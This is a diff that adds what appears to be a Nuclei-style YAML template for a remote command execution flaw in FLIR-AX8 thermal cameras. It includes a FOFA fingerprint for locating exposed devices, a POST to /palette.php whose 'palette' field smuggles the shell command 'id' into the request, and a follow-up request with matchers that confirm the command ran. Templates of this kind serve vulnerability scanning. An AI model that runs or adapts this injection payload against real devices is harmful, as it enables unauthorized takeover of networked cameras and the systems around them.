@@ -1,0 +1,39 @@
+id: flir-ax8-palettephp-rce
+
+info:
+  name: FLIR-AX8热成像仪palette.php接口远程命令执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: web.icon=="f4370ff0b4763e18159cd7cdf36a4542"
+          FLIR-AX8热成像仪的palette.php接口存在远程命令执行缺陷，攻击者可通过构造恶意请求在目标服务器上执行任意系统命令，导致服务器权限被完全控制、敏感数据泄露或系统服务中断。该漏洞影响路径包含res.php和settings/applyfirmware接口，具体表现为：
+          1. 向/res.php提交恶意参数可触发命令注入
+          2. 通过/settings/applyfirmware路径执行系统命令
+  tags: FLIR-AX8
+
+http:
+- raw:
+  - |
+    POST /palette.php HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+
+    palette=;id>66.txt;
+- raw:
+    - |
+      GET /66.txt HTTP/1.1
+      Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+    - type: regex
+      part: body
+      regex:
+        - uid=.*gid=.*
+    - type: status
+      part: header
+      status:
+        - 200
